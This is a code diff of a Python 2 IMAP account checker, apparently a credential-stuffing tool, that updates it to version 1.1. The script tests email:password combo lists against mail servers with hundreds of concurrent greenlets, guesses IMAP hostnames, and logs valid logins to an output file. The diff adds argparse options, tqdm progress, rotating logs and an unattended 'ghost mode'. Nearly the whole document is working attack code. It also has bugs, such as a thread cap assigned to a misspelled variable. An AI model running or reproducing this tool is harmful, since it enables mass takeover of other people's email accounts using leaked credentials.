@@ -1,53 +1,71 @@
 #!/usr/bin/python
 #- * -coding: utf-8 - * -
 import sys
-import gevent #
+import os
+import time
+from timeit import default_timer as timer
+import imaplib
+import itertools
+import argparse
+import logging
+from logging.handlers import RotatingFileHandler
+
+from tqdm import tqdm #pip install tqdm
+import gevent #pip install gevent
 from gevent.queue import *
 import gevent.monkey
-from timeit import default_timer as timer
-import random
+
 gevent.monkey.patch_all()
-import imaplib
-import email
-import time
-from progress.bar import IncrementalBar #pip install progress
-import itertools
-import cPickle as pickle
-import os
 
-asciii = """
-                                   
-,---.|    |              |         
-|---||--- |    ,---.,---.|--- ,---.
-|   ||    |    ,---||   ||    |    
-`   '`---'`---'`---^`   '`---'`    
-      Atlantr Imap Checker v1.0 - by SUP3RIA
-      
-""" 
 
-print asciii
+parser = argparse.ArgumentParser(description='Atlantr Imap Checker 1.1')
+parser.add_argument('-i','--input', help="Inputfile", required=False,type=str,default="mail_pass.txt")
+parser.add_argument('-o','--output', help='Outputfile', required=False,type=str,default="mail_pass_valid.txt")
+parser.add_argument('-t','--threads', help='Number of Greenlets spawned', required=False,type=int,default="512")
+parser.add_argument('-uh','--unknownhosts', help='Check for unknown hosts', required=False,type=bool,default=False)
+parser.add_argument('-l','--logging', help='Linecount logging', required=False,type=bool,default=True)
+parser.add_argument('-lsize','--logfilesize', help='Size of logfile in MB', required=False,type=int,default="5")
+parser.add_argument('-gm','--ghostmode', help='Continues linecount without userinput', required=False,type=bool,default=False)
+parser.add_argument('-iu','--invunma', help='Log invalid an unmatched accounts.', required=False,type=bool,default=True)
 
-if sys.argv[1: ]:
-    file_in = sys.argv[1]
-else :
-    file_in = "uniq_mail_pass.txt"
 
-if sys.argv[2: ]:
-    file_out = sys.argv[2]
-else :
-    file_out = "new_out.txt"
+args = vars(parser.parse_args())
 
-if sys.argv[3: ]:
-    workers = int(sys.argv[3]) + 1
-else :
-    workers = 800
+file_in = args['input']
+file_out = args['output']
+workers = args['threads']
+phosts = args['unknownhosts']
+llog = args['logging']
+logfilesize = args['logfilesize']
+ghsme = args['ghostmode']
+invunma = args['invunma']
 
-def write(i,file_out):
-    try:
-        with open(file_out, 'a') as file:
-            file.write('{}'.format(i+'\n'))
-    finally:
-        file.close()
+if workers > 1500:
+    print "Threads are limited to 1500. Use hp-mode otherwise.."
+    wokers = 1500
+
+logger1 = logging.getLogger("valid Log")
+logger1.setLevel(logging.DEBUG)
+handler1 = logging.FileHandler(file_out)
+logger1.addHandler(handler1)
+
+if invunma:
+    logger3 = logging.getLogger("unmatched Log")
+    logger3.setLevel(logging.DEBUG)
+    handler1 = logging.FileHandler((file_in[:-4]+'_unmatched.txt'))
+    logger3.addHandler(handler1)
+
+    logger4 = logging.getLogger("invalid Log")
+    logger4.setLevel(logging.DEBUG)
+    handler1 = logging.FileHandler((file_in[:-4]+'_invalid.txt'))
+    logger4.addHandler(handler1)
+
+
+if llog:
+    logger2 = logging.getLogger("Rotating Log")
+    logger2.setLevel(logging.DEBUG)
+    handler2 = RotatingFileHandler("count.log", maxBytes=logfilesize*1024*1024, backupCount=1)
+    logger2.addHandler(handler2)
 
 def imap(usr, pw, host):
     usr = usr.lower()
@@ -69,14 +87,13 @@ def init_ImapConfig():
               hoster = line.strip().split(':')
               ImapConfig[hoster[0]] = hoster[1]
 
-
 def get_imapConfig(email):
     try:
         hoster = email.lower().split('@')[1]
         return ImapConfig[hoster]
     except:
         return False
-   
+
 def yes_or_no(question):
     reply = str(raw_input(question+' (y/n): ')).lower().strip()
     if reply[0] == 'y':
@@ -84,57 +101,59 @@ def yes_or_no(question):
     if reply[0] == 'n':
         return False
     else:
-        return yes_or_no("Uhhhh... please enter ")   
-        
-        
-def save_lineCount(count):
-	with open("count.p", "wb") as f:
-		pickle.dump(count, f)
-        
+        return yes_or_no("Uhhhh... please enter ")
+
+
 def get_lineCount():
     try:
-        count = pickle.load( open( "count.p", "rb" ) )
-        return int(count)
+        a=open('count.log','rb')
+        lines = a.readlines()
+        if lines:
+            last_line = lines[-1]
+            a.close()
+            return int(last_line.strip())
+        else:
+            return 0
     except:
         return 0
 
-
 def getunknown_imap(subb):
-	#print "Checking unknown host ",subb,"for Imap.."
-	sub = ['imap','mail','pop','pop3','imap-mail','inbound','mx','imaps','smtp','m']
-	for host in sub:
-		host = host+'.'+subb
-		try:
-			mail = imaplib.IMAP4_SSL(str(host))
-			a = str(mail.login('test', 'test'))
-		except imaplib.IMAP4.error:
-			return host
-		except:
-			pass
-	return False
+    sub = ['imap','mail','pop','pop3','imap-mail','inbound','mx','imaps','smtp','m']
+    for host in sub:
+        host = host+'.'+subb
+        try:
+            mail = imaplib.IMAP4_SSL(str(host))
+            a = str(mail.login('test', 'test'))
+        except imaplib.IMAP4.error:
+            return host
+        except:
+            pass
+    return False
 
 def sub_worker(task):
-    global count_valid 
-    global count_invalid 
-    global count_unmatched 
+    global count_valid
+    global count_invalid
+    global count_unmatched
+    count_valid = 0
+    count_invalid = 0
+    count_unmatched = 0
     task2 = task.split(':')
     host = get_imapConfig(task2[0])
-    #if host == False:
-		#o = getunknown_imap(task2[0])
-		#if o != False:
-		#	host = o
+    if phosts:
+        if host == False:
+            o = getunknown_imap(task2[0])
+            if o != False:
+                host = o
     if host == False:
-        write(task,file_out[:-4]+'_unmatched.txt')
-        unmatched = count_unmatched + 1
+        logger3.debug(task)
+        count_unmatched = count_unmatched + 1
         return False
-        #q.task_done()
     l = imap(task2[0], task2[1], host)
     if l == 'OK':
-        #print task, True
-        write(task,file_out)
+        logger1.debug(task)
         count_valid = count_valid + 1
     if l == False:
-        #print task, False
+        logger4.debug(task)
         count_invalid = count_invalid  + 1
     if l == "Error":
         #q.put(task)
@@ -149,23 +168,23 @@ def worker():
         try:
             s = sub_worker(task)
         finally:
-            if s != False:
-                gevent.sleep(random.uniform(0.01,0.09))
-            bar.next()
+            pbar.update()
             line_count += 1
-            save_lineCount(line_count)
-            #q.task_done()
+            if llog:
+                logger2.debug(line_count)
 
 def loader():
-    global linesSum
-    linesSum = 0
     par1 = get_lineCount()
     if par1 != 0:
-        yes = yes_or_no("Resume old line-count?:")
+        if ghsme == False:
+            yes = yes_or_no("Resume old line-count?:")
+        else:
+            yes = True
+
         if yes == False:
-			os.remove("count.p")
-			par1 = 0
-    print "Loading list..."
+            os.remove("count.log")
+            par1 = 0
+    print "Preparing list (this might take a while)."
     with open(file_in, "r") as text_file:
         for line in itertools.islice(text_file, par1, None):
             if len(line.strip()) > 1 and ':' in line.strip():
@@ -175,12 +194,8 @@ def loader():
                         b = line.split(':')[1].strip()
                         line = b.lower()+':'+a
                     q.put(line.strip(),timeout=3)
-                    linesSum += 1
                 except:
                     pass
-
-
-                     
 
 def asynchronous():
     threads = []
@@ -189,21 +204,18 @@ def asynchronous():
     start = timer()
     gevent.joinall(threads,raise_error=True)
     end = timer()
+    pbar.close()
     print "\n\nTime passed: " + str(end - start)[:6]
     print "\nFound",count_valid, "valid Accounts.","\n(",count_invalid,'invalid and for',count_unmatched,'no settings were found.)'
-
-
-count_valid = 0
-count_invalid = 0
-count_unmatched = 0
 
 
 init_ImapConfig()
 q = gevent.queue.JoinableQueue()
 gevent.spawn(loader).join()
-bar = IncrementalBar('Processing', max=linesSum)
+pbar = tqdm(total=q.qsize())
 asynchronous()
+
 try:
-	os.remove("count.p")
+    os.remove("count.log")
 except:
-	pass
+    pass
